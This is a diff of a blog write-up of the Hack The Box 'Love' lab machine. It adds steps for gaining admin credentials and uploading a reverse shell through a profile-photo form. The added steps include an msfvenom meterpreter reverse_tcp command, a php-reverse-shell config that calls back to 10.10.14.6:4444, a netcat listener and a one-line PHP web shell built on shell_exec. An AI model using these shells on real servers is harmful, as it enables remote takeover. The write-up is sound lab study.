@@ -142,7 +142,7 @@ After re-rereading nmap's output, there's something I didn't see:
 ![I'm blind]({{https://jsom1.github.io/}}/_images/htb_love_blind.png)
 </div>
 
-We add this host to our host file:
+There is a subdomain! We add it to our host file:
 
 ````
 sudo echo '10.10.10.239 staging.love.htb >> /etc/hosts
@@ -154,7 +154,7 @@ And browse to it:
 ![site 2]({{https://jsom1.github.io/}}/_images/htb_love_site2.png){: height="415px" width = 625px"}
 </div>
 
-Ther's not much on the home page, but here's the *Demo* tab:
+There's not much on the home page, but here's the *Demo* tab:
 
 <div class="img_container">
 ![site 3]({{https://jsom1.github.io/}}/_images/htb_love_site3.png)
@@ -174,6 +174,70 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f 
 `````
 
 I then started a *multi/handler* and uploaded the file on the server. En error message appears: "This program cannot be run in DOS mode.". I Googled it and it appears this error occurs when we try to run a program intended for Windows inside DOS. DOS (Disk Operating System) is an OS that runs from a hard disk drive. It can also refer to a particular family of disk OS, most commonly MS-DOS (Microsoft-DOS).\\
+Anyways, I didn't think about it so far, but we can inspect the page and try to find the definition of the function that scans the input. To do so we right click on the page, click *inspect element* and then go to the *Debugger* tab. There, we see that when we submit a file, this latter is passed to the *validateForm()* function. We also see it definition, which is the following:
+
+````
+function validateForm() {
+   var x = document.forms["fileform"]["file"].value;
+   if (x == "") {
+   alert("Please enter a file url to scan");
+   return false;
+   }
+}
+``````
+
+This script doesn't seem to do much. At this point I had to ask for help and I'm glad I did because I'd never have thought about doing that: nmap showed us a service on port 5000 (another web server, also recognised once as upnp). We're supposed to use this as follows:
+
+<div class="img_container">
+![creds]({{https://jsom1.github.io/}}/_images/htb_love_creds.png)
+</div>
+
+This way, we can access the other web server. I didn't show it in this write-up, but I tried to access it from my browser and got access denied. I don't know why, I just didn't think about trying that at all...\\
+Great, we have credentials! We can go back to *love.htb/admin* and use them here to login. 
+
+<div class="img_container">
+![dashboard]({{https://jsom1.github.io/}}/_images/htb_love_db.png)
+</div>
+
+We land on a dashboard. The menu contains different tabs, but all of them are empty. We see a user called *Neovic Devierte*. When clicking on the username, we see we can update the profile. A menu opens, and we can add a photo. Maybe we can add a file, so let's try to upload our *windows/meterpreter/reverse_tcp* payload. I don't show the output here because it didn't work... Is is because of the "DOS" error w saw earlier?\\
+We can also try to use a webshell from */usr/share/webshells*. Because the application is written in PHP, we'll use */usr/share/webshells/php/php-reverse-shell.php*. We must modify two lines in the code:
+
+````
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.14.6';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+`````
+
+Then we set up a netcat listener:
+
+````
+sudo nc -nlvp 4444
+`````
+
+And we upload the file on the server:
+
+<div class="img_container">
+![PHP upload]({{https://jsom1.github.io/}}/_images/htb_love_uploadphp.png)
+</div>
+<div class="img_container">
+![revsh fail]({{https://jsom1.github.io/}}/_images/htb_love_revshfail.png)
+</div>
+
+We see the target connected back to us, but the connection closed after an error... I googled this error and landed on a forum. Someone explains it's because uname doesn't exist on Windows, and it's better to use our own php reverse shell, something like the following:
+
+````
+<?php echo shell_exec($_GET[‘cmd’]).’ 2>&1’); ?>
+``````
+
+
 
 
 <ins>**My thoughts**</ins>
